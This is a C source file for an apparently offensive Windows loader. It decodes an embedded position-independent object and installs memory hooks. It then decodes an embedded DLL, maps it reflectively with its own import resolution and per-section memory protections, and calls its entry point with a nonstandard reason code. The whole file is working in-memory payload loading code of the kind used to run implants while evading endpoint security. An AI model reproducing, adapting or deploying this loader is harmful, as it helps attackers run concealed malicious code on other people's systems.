#include <windows.h>
#include "bud.h"
#include "tcg.h"

DECLSPEC_IMPORT LPVOID WINAPI  KERNEL32$VirtualAlloc( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI  KERNEL32$VirtualProtect( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT void*  WINAPIV MSVCRT$malloc( size_t );
DECLSPEC_IMPORT void   WINAPIV MSVCRT$free( void* );

_RESOURCE g_pico[0] __attribute__(( section( "pico" )));
_RESOURCE g_dll[0]  __attribute__(( section( "dll"  )));

int __tag_setupHooks( );

#define memcpy(dst, src, len) __movsb(( u_char* )( dst ), ( u_char* )( src ), len );
#define memset(dst, src, len) __stosb(( u_char* )( dst ), src, len );

#define FLAG(x, y) (((x) & (y)) == (y))

#define TEMP_BUFFER_SZ 1024 * 1024

extern PVOID calculateFunctionStackSizeWrapper( PVOID );

void __attribute__((noinline)) recover( _RESOURCE* rsrc ) {
    __asm__ __volatile__("");
}

void __attribute__((noinline)) setupHooks( char* pico_src, char* pico_code, PALLOCATED_MEMORY memory ) {
    __asm__ __volatile__("");
}

void fixSectionPermissions( DLLDATA* dll_data, char* dll_src, char* dst_dst, PALLOCATED_MEMORY_REGION region )
{
    DWORD new_protect = PAGE_READONLY;

    /* headers are ro */
    DWORD old_protect;
    KERNEL32$VirtualProtect( dst_dst, dll_data->NtHeaders->OptionalHeader.SizeOfHeaders, new_protect, &old_protect );

    region->sections[0].baseAddress     = dst_dst;
    region->sections[0].virtualSize     = dll_data->NtHeaders->OptionalHeader.SizeOfHeaders;
    region->sections[0].currentProtect  = new_protect;
    region->sections[0].previousProtect = new_protect;

    /* walk remaining sections */
    IMAGE_SECTION_HEADER* section_hdr  = (IMAGE_SECTION_HEADER*)(IMAGE_FIRST_SECTION(dll_data->NtHeaders));

    for ( int i = 1; (i - 1) < dll_data->NtHeaders->FileHeader.NumberOfSections; i++ )
    {
        PVOID section_dst  = dst_dst + section_hdr->VirtualAddress;
        DWORD section_size = section_hdr->SizeOfRawData;

        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_WRITE )) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_READ )) {
            new_protect = PAGE_READONLY;
        }
        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE )) {
            new_protect = PAGE_READWRITE;
        }
        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_EXECUTE )) {
            new_protect = PAGE_EXECUTE;
        }
        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE )) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ )) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( FLAG( section_hdr->Characteristics, IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE )) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        KERNEL32$VirtualProtect( section_dst, section_size, new_protect, &old_protect );

        /* track memory */
        region->sections[i].baseAddress     = section_dst;
        region->sections[i].virtualSize     = section_size;
        region->sections[i].currentProtect  = new_protect;
        region->sections[i].previousProtect = new_protect;

        /* advance section */
        section_hdr++;
    }
}

void go( PVOID args )
{
    /* allocate rw memory for our transformed pico */
    _RESOURCE* rsrc_rw = ( _RESOURCE* )( MSVCRT$malloc( TEMP_BUFFER_SZ ));

    /* copy transformed pico data to rw memory */
    memcpy( rsrc_rw, g_pico, g_pico->length + 4 );

    /* run recovery chain */
    recover( rsrc_rw );

    /* plaintext pico now in rsrc_rw->value  */
    char* pico_src = ( char* )( rsrc_rw->value );

    /* allocate memory for it */
    char* pico_data = KERNEL32$VirtualAlloc( NULL, PicoDataSize( pico_src ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    char* pico_code = KERNEL32$VirtualAlloc( NULL, PicoCodeSize( pico_src ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    /* populate funcs */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* load it into memory */
    PicoLoad( &funcs, pico_src, pico_code, pico_data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect( pico_code, PicoCodeSize( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    /* call entry point to overwrite funcs.GetProcAddress */
    PicoEntryPoint( pico_src, pico_code )( ( char* )( &funcs ) );

    /* begin tracking memory allocations */
    PALLOCATED_MEMORY memory = ( PALLOCATED_MEMORY )( MSVCRT$malloc( sizeof(ALLOCATED_MEMORY) ));
    memset( memory, 0, sizeof(ALLOCATED_MEMORY) );

    memory->memoryRegions[0].allocationBase = pico_data;
    memory->memoryRegions[0].regionSize     = PicoDataSize( pico_src );
    memory->memoryRegions[1].allocationBase = pico_code;
    memory->memoryRegions[1].regionSize     = PicoCodeSize( pico_src );

    /* run the hook chain */
    setupHooks( pico_src, pico_code, memory );

    /* erase pico bufferand reuse for the dll */
    memset( rsrc_rw, 0, TEMP_BUFFER_SZ );
    memcpy( rsrc_rw, g_dll, g_dll->length + 4 );

    /* run recovery chain */
    recover( rsrc_rw );

    /* plaintext dll now in rsrc_rw->value  */
    char* dll_src = ( char* )( rsrc_rw->value );
    
    /* parse the dll */
    DLLDATA dll_data;
    ParseDLL( dll_src, &dll_data );

    /* alloc new memory */
    char* dll_dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL( &dll_data ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    /* load it */
    LoadDLL( &dll_data, dll_src, dll_dst );

    /* track dll's memory */
    memory->memoryRegions[2].allocationBase = dll_dst;
    memory->memoryRegions[2].regionSize     = SizeOfDLL( &dll_data );

    /* process the iat */
    ProcessImports( &funcs, &dll_data, dll_dst );
    
    /* set final memory permissions */
    fixSectionPermissions( &dll_data, dll_src, dll_dst, &memory->memoryRegions[2] );

    /* get the entry point */
    DLLMAIN_FUNC dll_main = EntryPoint( &dll_data, dll_dst );

    /* free the temp buffer */
    MSVCRT$free( rsrc_rw );

    /* call the entry point */
    dll_main(( HINSTANCE )( dll_dst ), DLL_PROCESS_ATTACH, NULL );
    dll_main(( HINSTANCE )( __text_begin( ) ), 4, args );
}
